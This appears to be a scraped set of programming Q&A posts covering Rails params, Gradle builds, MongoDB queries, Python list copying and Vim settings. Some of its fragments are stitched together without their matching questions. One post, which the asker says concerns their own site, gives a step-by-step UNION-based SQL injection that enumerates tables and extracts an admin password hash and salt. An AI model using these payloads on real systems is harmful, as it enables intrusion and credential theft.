row.Body: You are requiring :product which does not exist in the params you are sending to the controller. Either change the product_params to params.permit(:name, :price)(remove the require) or change mydata to {product: { 'name': 'marioproduct', 'price': '99' }}

I am trying to generate a jar file from this library by using Apache Maven.When I tried to run mvn package within the downloaded repository I got a message specifying that there was no pom.xml.

I installed gradle and ran the gradle tasks,this is what I obtained:

:tasks

------------------------------------------------------------
All tasks runnable from root project
------------------------------------------------------------

Build Setup tasks
-----------------
init - Initializes a new Gradle build. [incubating]
wrapper - Generates Gradle wrapper files. [incubating]

Help tasks
----------
components - Displays the components produced by root project 'java-geojson-mast
er'.
dependencies - Displays all dependencies declared in root project 'java-geojson-
master'.
dependencyInsight - Displays the insight into a specific dependency in root proj
ect 'java-geojson-master'.
help - Displays a help message
projects - Displays the sub-projects of root project 'java-geojson-master'.
properties - Displays the properties of root project 'java-geojson-master'.
tasks - Displays the tasks runnable from root project 'java-geojson-master'.

To see all tasks and more detail, run with --all.

BUILD SUCCESSFUL

I tried running these tasks and nothing happens.I tried running gradle build and gradle assemble but both of them failed.

How can I generate a jar file for use within my project?
row.Title: How to generate a jar file using this library

row.Body:
Hello and thanks for reading and any feedback I am trying to insert/update a table by an SQL injection.

This is my site for my studies and noticed that it was vulnerable to sql injections.

I was able to extract all data from the database know all the table, column but whenever I tried to update/Insert a new row the browser just tells me there is an error in the syntax.

I was able to obtain the tables and columns and the data inside using these queries

blogcategories.php?categoryID=3'

blogcategories.php?categoryID=3 order by 3--

blogcategories.php?categoryID=null union all select 1,2,3--

blogcategories.php?categoryID=null union all select 1,@@version,3--

(returned version 5.6.16)

blogcategories.php?categoryID=null union all select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--

(Returned all the table names in the database)

blogcategories.php?categoryID=null union all select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()--

(Returned all the column names in the database)

blogcategories.php?categoryID=null%20union%20all%20select%201,group_concat(adminID,0x3a,username,0x3a,password,0x3a,salt,0x3a,email,0x3a,type),3%20from%20admin%20where%20adminID=1--

Result database results for query above

adminID: 1

username: admin

password: 9d26a3c61c0e2ce5c980ad8c7fff13c08cf898b6f3786930c73b68e3b88ad779

salt: 002640cb549ba08ee90cd79aee89cce7

email: email@hotmail.com

type: 0

Now that I have extracted the essential data how would I bypass the salted password or run a query update that users password or insert a new row under that table.

As well as a way to stop this vulnerability.

As I said above this is my OWN site and I am a student studying web development and I see this as a big flaw work.

Thanks for reading and hope you can solve my issue :3
row.Title: How to INSERT/UPDATE SQL injection

row.Body:
There is a $nor operator that you can apply to your list of friends to make sure all are excluded from the result. The other part is a simple $regex operator to match the names beginning with "An":

var friends = [
   {username: "Anders", age: 10}, 
   {username: "Bella", age: 21}, 
   {username: "Debbie", age: 22}
];

var query = { "$nor": friends, "username": { "$regex": "^An" } };

Your most efficient index here is clearly on "username" and "age", and note that anchoring the "regex" here is the only thing that will work efficiently for you.

var pagefunction = {
    anotherfunction:function(){
        alert("it worked");
    }
}
pagefunction.anotherfunction();

For more details visit http://www.sitepoint.com/5-ways-declare-functions-jquery/

Using deepcopy should work -- I suspect you were just using it in the wrong place.

The danger of using a single list as a template, as you were doing with a is that if you mutate it, you could end up changing the lists you've already appended to b. One way to get around this problem is to always create a new copy of a whenever you want to change it, like so:

import copy

b = []

a = [1,8,10]
b.append(a)

a2 = copy.deepcopy(a)
a2[0] = a2[0] - 1
b.append(a2)

print(b)

Another way might be to make a copy of a whenever you append it to b, so that you don't have to keep creating new variables:

import copy

b = []

a = [1,8,10]
b.append(copy.deepcopy(a))

a[0] = a[0] - 1
b.append(copy.deepcopy(a))

print(b)

As a side note, another way to create a copy of a list is to do a2 = a[:]. The a[:] is telling Python to get a list slice of a starting from the beginning of the list to the end, essentially copying it. Note that this is a shallow copy, not a deep copy. However, since your lists contain only numbers, a shallow copy should work fine.
Try switching the CPU from the ARM CPU to the Intel CPU

I'm trying to disable syntax for Markdown files using autocmd in Vim. I have the following in my .vimrc:

function! SyntaxOff()
    echom "one"
    syntax off
    echom "two"
endfunction
autocmd filetype markdown exe "call SyntaxOff()"

When I open a Markdown file and check :messages, I can see the one and two, and yet the syntax is still on. If I open a dummy file and subsequently open a Markdown file, then I can see that syntax is disabled. If I then open a file of a different filetype, then syntax is still disabled. My guess is that something else in my .vimrc is re-enabling the syntax when I open Vim up for the first time, but then after the function runs syntax is permanently shut off.

So my questions are (1) How can I disable syntax for Markdown files when I open them directly (i.e. not using the maneuver described above)? (2) How can I get Vim to re-enable syntax when I then open another file of a different filetype?
row.Title: Vim: How to disable syntax altogether for certain filetype

row.Body:
I think what you're trying to do runs opposite of why someone would be killing an app. When the user is trying to purposely close the app, that user does NOT want the app to do anything more.

Why do you need to check if the user is killing the app? If you need to save data, then you should design your app to save data when the user is actively using your app.

This sounds like a design problem. Ideally, you should limit the places where a variable changes to very specific locations in your code. This is one reason to avoid global variables and static variables unless you have very good reasons to use them. Even then, you should define accessor methods as an interface for these variables rather than changing them directly.

As you debug your code, I suggest you look for ways you can improve it so that debugging isn't so difficult in the future.
